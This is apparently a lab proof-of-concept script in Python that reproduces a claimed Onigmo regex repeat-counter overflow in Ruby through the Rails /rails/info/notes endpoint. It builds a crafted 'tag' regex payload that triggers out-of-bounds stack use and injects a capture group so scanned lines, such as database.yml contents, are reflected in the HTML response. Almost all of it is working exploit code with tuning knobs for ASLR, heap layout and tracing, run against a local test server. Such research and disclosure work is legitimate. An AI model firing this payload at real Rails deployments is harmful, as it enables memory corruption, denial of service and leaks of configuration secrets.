#!/usr/bin/env python3
"""Stock Rails wire probe for Onigmo CVE-2026-110264.

The unmodified /rails/info/notes endpoint interpolates params[:tag] into several
regexps.  Ruby 3.4.11 and earlier wrap 16-bit repeat IDs; the generated pattern
executes enough range repeats to reach repeat_stk[-32768].  Optional reflection
injection makes PatternExtractor return every scanned line, so any corrupted
line bytes can be observed in the stock HTML response.

This is an analysis reproducer, not an RCE claim.  It starts only the generated
stock Rails app on loopback and uses ordinary form bytes.
"""
from __future__ import annotations

import hashlib
import http.client
import json
import os
from pathlib import Path
import resource
import subprocess
import sys
import time
from urllib.parse import urlencode

ROOT = Path(__file__).resolve().parents[2]
EV = ROOT / "lab/build/evidence"
APP = ROOT / "lab/build/rails-stock-app"
DEFAULT_RUBY = ROOT / "lab/build/plain/ruby-3.4.11-plain/bin/ruby"
FIXED_RUBY = ROOT / "lab/build/plain/ruby-3.4.13-plain/bin/ruby"


def no_core() -> None:
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))


def build_tag(units: int, pad: int, reflect: bool, unit: str, layout: str, stack_pad: int, anchor: bool, atomic: bool) -> str:
    if units < 0 or pad < 0 or stack_pad < 0:
        raise ValueError("units, pad and stack_pad must be nonnegative")
    if layout == "sequential":
        exploit = "(?:x{0,100}){0,100}" + unit * units
    elif layout == "shallow":
        exploit = (
            "(?:(?:x{0,100}){0,100}"
            + "(?:x){1,100}" * units
            + "|"
            + "(?=" * stack_pad
            + unit
            + ")" * stack_pad
            + ")"
        )
    else:
        raise ValueError(f"unknown layout: {layout}")
    if pad:
        exploit += "(?#" + "P" * pad + ")"
    if not reflect:
        return exploit
    # Rails wraps this as /#\s*(TAG):?\s*(.*)$/.  Close the first capture,
    # add an all-lines branch whose second capture is the whole line, execute
    # the repeat payload in a lookahead, and let the wrapper's ')' close the
    # empty non-capturing group opened here.
    if atomic:
        return "x)|(?>(.*)(?=" + exploit + ")"
    return "x)|(" + ("\\A.*" if anchor else ".*") + ")(?=" + exploit + ")(?:"


def form_body(fields: list[tuple[str, str]], multipart: bool) -> tuple[bytes, str]:
    if not multipart:
        return urlencode(fields).encode(), "application/x-www-form-urlencoded"
    boundary = "X2ONIGMOBOUND"
    chunks: list[bytes] = []
    for name, value in fields:
        chunks.append(
            (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"\r\n'
                "Content-Type: text/plain; charset=UTF-8\r\n\r\n"
            ).encode()
        )
        chunks.append(value.encode())
        chunks.append(b"\r\n")
    chunks.append(f"--{boundary}--\r\n".encode())
    return b"".join(chunks), f"multipart/form-data; boundary={boundary}"



def wait_ready(proc: subprocess.Popen, port: int) -> bool:
    for _ in range(300):
        if proc.poll() is not None:
            return False
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=1)
            conn.request("GET", "/up")
            response = conn.getresponse()
            response.read()
            conn.close()
            if response.status == 200:
                return True
        except OSError:
            time.sleep(0.1)
    return False


def health(port: int) -> int | str:
    try:
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=2)
        conn.request("GET", "/up")
        response = conn.getresponse()
        response.read()
        conn.close()
        return response.status
    except OSError as exc:
        return type(exc).__name__


def main() -> int:
    mode = sys.argv[1] if len(sys.argv) > 1 else "attack"
    tag = sys.argv[2] if len(sys.argv) > 2 else f"onigmo-repeat-{mode}"
    if mode not in {"attack", "control", "safe", "fixed", "calibrate"}:
        raise SystemExit("usage: ruby2shell-onigmo-repeat-wire.py attack|control|safe|fixed|calibrate [tag]")
    if not (APP / "config/environment.rb").is_file():
        raise SystemExit("missing stock Rails app; run lab/repro/ruby2shell-stock-rails-setup.sh")

    ruby_override = os.environ.get("RUBY2SHELL_ONIGMO_RUBY")
    ruby = Path(ruby_override) if ruby_override else FIXED_RUBY if mode == "fixed" else DEFAULT_RUBY
    if not ruby.is_absolute():
        ruby = ROOT / ruby
    if not ruby.is_file():
        raise SystemExit(f"missing Ruby build: {ruby}")

    gem_override = os.environ.get("RUBY2SHELL_ONIGMO_GEM_PATH")
    if gem_override:
        gem_path = Path(gem_override)
        if not gem_path.is_absolute():
            gem_path = ROOT / gem_path
    else:
        gem_dirs = sorted(
            path for path in (ruby.parent.parent / "lib/ruby/gems").glob("[0-9]*.[0-9]*.0") if path.is_dir()
        )
        if len(gem_dirs) != 1:
            raise SystemExit(f"cannot select gem path for {ruby}: {gem_dirs}")
        gem_path = gem_dirs[0]

    port = int(os.environ.get("RUBY2SHELL_ONIGMO_PORT", "4630"))
    units = int(os.environ.get("RUBY2SHELL_ONIGMO_UNITS", "2" if mode == "control" else "32767"))
    pad = int(os.environ.get("RUBY2SHELL_ONIGMO_PAD", "0"))
    reflect = os.environ.get("RUBY2SHELL_ONIGMO_REFLECT", "1") != "0"
    unit = os.environ.get("RUBY2SHELL_ONIGMO_UNIT", "(?:.){0,100}")
    layout = os.environ.get("RUBY2SHELL_ONIGMO_LAYOUT", "sequential")
    stack_pad = int(os.environ.get("RUBY2SHELL_ONIGMO_STACK_PAD", "0"))
    anchor = os.environ.get("RUBY2SHELL_ONIGMO_ANCHOR", "0") != "0"
    atomic = os.environ.get("RUBY2SHELL_ONIGMO_ATOMIC", "0") != "0"
    extra_params = int(os.environ.get("RUBY2SHELL_ONIGMO_EXTRA_PARAMS", "0"))
    extra_len = int(os.environ.get("RUBY2SHELL_ONIGMO_EXTRA_LEN", "0"))
    timeout = float(os.environ.get("RUBY2SHELL_ONIGMO_TIMEOUT", "60"))
    second = bool(os.environ.get("RUBY2SHELL_ONIGMO_SECOND"))
    second_reflect = bool(os.environ.get("RUBY2SHELL_ONIGMO_SECOND_REFLECT"))
    trace = bool(os.environ.get("RUBY2SHELL_ONIGMO_TRACE"))
    multipart = bool(os.environ.get("RUBY2SHELL_ONIGMO_MULTIPART"))
    pattern = "TODO" if mode == "safe" else build_tag(units, pad, reflect, unit, layout, stack_pad, anchor, atomic)
    fields = [("_method", "GET"), ("tag", pattern)]
    fields.extend((f"x{i}", "X" * extra_len) for i in range(extra_params))
    body, content_type = form_body(fields, multipart)
    aslr_off = bool(os.environ.get("RUBY2SHELL_ONIGMO_ASLR_OFF"))
    second_tag = build_tag(2, 0, True, unit, layout, 0, anchor, atomic) if second_reflect else "TODO"
    second_body = urlencode({"_method": "GET", "tag": second_tag}).encode()

    env = os.environ.copy()
    env["GEM_PATH"] = str(gem_path) + ((":" + env["GEM_PATH"]) if env.get("GEM_PATH") else "")
    env["RAILS_MAX_THREADS"] = os.environ.get("RAILS_MAX_THREADS", "1")
    if os.environ.get("RUBY2SHELL_ONIGMO_MMAP_THRESHOLD"):
        env["MALLOC_MMAP_THRESHOLD_"] = os.environ["RUBY2SHELL_ONIGMO_MMAP_THRESHOLD"]
    if trace:
        preload = str(ROOT / "lab/preload/jemregtrace.so")
        env["LD_PRELOAD"] = preload + ((":" + env["LD_PRELOAD"]) if env.get("LD_PRELOAD") else "")
        env["JEMREGTRACE_FD"] = "2"
        env["JEMREGTRACE_ARM"] = str(EV / f"{tag}.arm")
        env["JEMREGTRACE_WATCH_MIN"] = os.environ.get("RUBY2SHELL_ONIGMO_TRACE_MIN", "0x3f000")
        env["JEMREGTRACE_WATCH_MAX"] = os.environ.get("RUBY2SHELL_ONIGMO_TRACE_MAX", "0x41000")

    EV.mkdir(parents=True, exist_ok=True)
    log_path = EV / f"{tag}.server.log"
    result_path = EV / f"{tag}.json"
    response_path = EV / f"{tag}.html"
    second_response_path = EV / f"{tag}.second.html"
    arm_path = EV / f"{tag}.arm"
    pid_path = EV / f"{tag}.pid"
    if trace:
        arm_path.unlink(missing_ok=True)
    command = [str(ruby), str(APP / "bin/rails"), "server", "-b", "127.0.0.1", "-p", str(port), "--pid", str(pid_path)]
    if aslr_off:
        command = ["setarch", os.uname().machine, "-R"] + command
    result: dict[str, object] = {
        "mode": mode,
        "tag": tag,
        "ruby": str(ruby.relative_to(ROOT)) if ruby.is_relative_to(ROOT) else str(ruby),
        "gem_path": str(gem_path.relative_to(ROOT)) if gem_path.is_relative_to(ROOT) else str(gem_path),
        "port": port,
        "units": units,
        "pad": pad,
        "reflect": reflect,
        "unit": unit,
        "layout": layout,
        "stack_pad": stack_pad,
        "anchor": anchor,
        "atomic": atomic,
        "pattern_bytes": len(pattern.encode()),
        "body_bytes": len(body),
        "body_sha256": hashlib.sha256(body).hexdigest(),
        "extra_params": extra_params,
        "extra_len": extra_len,
        "rails_max_threads": env["RAILS_MAX_THREADS"],
        "mmap_threshold": env.get("MALLOC_MMAP_THRESHOLD_"),
        "trace": trace,
        "second": second,
        "second_reflect": second_reflect,
        "multipart": multipart,
        "aslr_off": aslr_off,
    }
    with log_path.open("wb") as log:
        proc = subprocess.Popen(
            command,
            cwd=ROOT,
            env=env,
            stdout=log,
            stderr=subprocess.STDOUT,
            preexec_fn=no_core,
        )
        try:
            result["ready"] = wait_ready(proc, port)
            if result["ready"]:
                started = time.monotonic()
                if trace:
                    arm_path.touch()
                try:
                    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=timeout)
                    conn.request(
                        "POST",
                        "/rails/info/notes",
                        body=body,
                        headers={
                            "Content-Type": content_type,
                            "Content-Length": str(len(body)),
                        },
                    )
                    response = conn.getresponse()
                    data = response.read()
                    response_path.write_bytes(data)
                    result["http_status"] = response.status
                    result["response_bytes"] = len(data)
                    result["response_sha256"] = hashlib.sha256(data).hexdigest()
                    if data:
                        text = data.decode(errors="replace")
                        result["database_yml_mentions"] = text.count("database.yml")
                        result["adapter_lines"] = text.count("adapter:")
                    if second:
                        conn.request(
                            "POST",
                            "/rails/info/notes",
                            body=second_body,
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Content-Length": str(len(second_body)),
                            },
                        )
                        second_response = conn.getresponse()
                        second_data = second_response.read()
                        second_response_path.write_bytes(second_data)
                        result["second_http_status"] = second_response.status
                        result["second_response_bytes"] = len(second_data)
                        result["second_response_sha256"] = hashlib.sha256(second_data).hexdigest()
                    conn.close()
                except OSError as exc:
                    result["request_error"] = repr(exc)
                result["request_seconds"] = round(time.monotonic() - started, 3)
                time.sleep(0.2)
                result["exit_after_request"] = proc.poll()
                result["health"] = health(port)
        finally:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
            pid_path.unlink(missing_ok=True)

    server_log = log_path.read_text(errors="replace")
    result["server_log_tail"] = server_log[-2_000:]
    if mode == "calibrate":
        ok = result.get("ready") is True
    elif mode in {"attack", "control"}:
        ok = result.get("ready") is True
    elif mode == "safe":
        ok = result.get("http_status") == 200 and result.get("health") == 200
    else:
        ok = (
            result.get("http_status") == 500
            and result.get("health") == 200
            and "too many range repeat" in server_log
        )
    result["expected_observed"] = ok
    result_path.write_text(json.dumps(result, indent=2) + "\n")
    print(json.dumps({k: v for k, v in result.items() if k != "server_log_tail"}, indent=2))
    if not ok:
        print(server_log[-2_000:], file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
